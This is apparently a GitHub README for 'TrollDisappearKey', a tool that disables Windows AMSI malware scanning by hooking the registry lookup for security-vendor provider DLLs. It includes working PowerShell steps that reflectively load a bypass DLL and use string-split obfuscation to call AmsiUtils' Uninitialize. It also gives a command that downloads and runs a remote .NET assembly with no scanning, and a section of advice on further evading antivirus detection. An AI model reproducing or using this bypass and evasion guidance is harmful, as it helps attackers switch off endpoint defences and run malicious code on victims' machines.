# TrollDisappearKey
TrollDisappearKey   -> .cs code to compile into a .exe that can load .exe assemblies without amsi scanning taking place during assembly.load() \
TrollDisappearKeyPS -> .cs code to compile into a .dll to reflectively load to bypass powershell amsi 


# How does it work?
Upon assembly.load(), internals of amsi/clr will search for reg key "Software\Microsoft\AMSI\Providers" to load the relevant provider dlls (i.e security vendor dlls) 
We hook the reg query function and when amsi/clr tries to read "Software\Microsoft\AMSI\Providers" we overwrite its value to "Software\Microsoft\AMSI\Providers "  <- note the space after providers
This breaks the provider dlls loading process and we are able to assembly load any .net assembly we want. For the powershell amsi, its somewhat similar, we break the vendor dll loading and call uninitialize to trigger a reinitialize. 

## .powershell Usage 
![Image](https://github.com/user-attachments/assets/f6b4d83a-ed24-433b-9e2a-4cf6bfe1d1b0)
```
pwd  # run any random command first, this is a must 

[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\TrollDisappearKeyPS.dll"))
[TrollDisappearKeyPS]::DisappearKey()

$t1 = 'System.Manage'
$t2 = 'ment.Automa'
$t3 = 'tion.A'
$t4 = 'msi'
$t5 = 'Utils'
$object = [Ref].Assembly.GetType($t1 + $t2 + $t3 + $t4 + $t5)
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)
```

## Detections 
![Image](https://github.com/user-attachments/assets/60ff00a8-b619-407e-8083-29efc38c632d)



  
## .exe Usage 
![Image](https://github.com/user-attachments/assets/f1678081-5fa8-4f4d-b7d3-ae9bd2e02a9f)
![Image](https://github.com/user-attachments/assets/7ef91a6a-957f-4c91-80a2-c0b54409917c)

```
TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
```

## Example
```
TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
```
## Detections 
Not too bad since zero effort to evade detection, there's tons of things to improve but i shall leave it to the reader \
you can immediately drop it to maybe 5 by altering the ExecuteAssembly() function since its using standard code that's deemed malicious \
Can rename certain strings the the reg key path  \
Avoid the use of certain API calls and improve the hook library further \
![Image](https://github.com/user-attachments/assets/e4c80f07-ddbc-4ed6-9ad0-c8e104931f90)


## Features
Nothing actually, its quite barebone with short code profile so anyone can tweak it to their needs  (e.g tweak the code to load .dll assemblies instead of just .exe assemblies)

## Credits
1. Modified hooking library from https://github.com/liulilittle/NetHook

## Disclaimer
Should only be used for educational purposes!







